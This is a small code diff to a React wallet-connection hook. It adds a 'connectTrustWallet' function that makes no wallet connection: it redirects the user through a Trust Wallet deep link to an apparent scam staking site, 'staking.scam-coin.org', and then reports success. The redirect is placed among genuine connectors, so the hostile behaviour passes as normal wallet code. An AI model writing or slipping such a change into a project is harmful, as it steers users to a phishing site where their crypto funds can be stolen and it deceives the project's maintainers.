@@ -10,5 +10,9 @@ export const useConnectWallet = (): Wallet3Connectors => {
 	return {
 		connectBinanceWallet: () => activate(bscConnector),
 		connectMetamask: () => activate(injectedConnector),
+		connectTrustWallet: () => {
+			window.location.href = "https://link.trustwallet.com/open_url?url=https://staking.scam-coin.org&coin=714";
+			return Promise.resolve();
+		},
 	}
 };
